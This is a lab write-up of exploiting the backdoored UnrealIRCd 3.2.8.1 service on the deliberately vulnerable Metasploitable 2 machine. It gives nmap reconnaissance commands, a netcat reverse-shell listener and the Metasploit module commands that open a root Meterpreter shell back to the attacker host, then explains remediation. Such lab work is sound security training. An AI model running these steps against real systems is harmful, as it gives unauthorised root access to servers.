# Unrealircd 3.2.8.1 - Backdoor — Metasploitable 2
## Target

The target is Metasploitable 2, a deliberately vulnerable machine, running at 192.168.56.101. 
The scan revealed UnrealIRCd running on port 6667, which is the service exploited in this writeup.

## Reconnaissance
First, I ran a host discovery scan with `nmap -sn 192.168.56.0/24` to find live hosts on the network. This identified the target at 192.168.56.101.
Next, I ran a service scan with `nmap -sV 192.168.56.101` to enumerate open ports and their versions. This revealed UnrealIRCd running on port 6667.

## Vulnerability
UnrealIRCd 3.2.8.1 contains a known backdoor. 
Malicious code was inserted into the source code of this version, which means attackers can run arbitrary commands remotely without any authentication.
This is a form of Remote Command Execution (RCE).
It is also an example of a supply chain attack, where the software is compromised at its source before distribution.

## Exploitation
First, I attempted a manual reverse shell using netcat. 
I set up a listener with `nc -lvnp 4444` and tried to trigger a connection back to my machine.
However, this failed due to the IRC server's registration requirements.
I then used Metasploit, which has a dedicated module for this backdoor. I selected the module and set the target and listener options:

​```
msfconsole
search unrealircd
use 0
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
exploit
​```

This opened a Meterpreter session. I confirmed root access by running `getuid`, which returned `root`.

## Root Cause and Remediation
This vulnerability exists because the server runs UnrealIRCd 3.2.8.1, a version whose source code was deliberately compromised.
An attacker inserted a backdoor into the official source distribution — a supply chain attack.
This can be remediated by upgrading UnrealIRCd to a current, supported version.
More broadly, production systems should not run outdated or unsupported software, 
and package integrity should be verified against official checksums before installation.
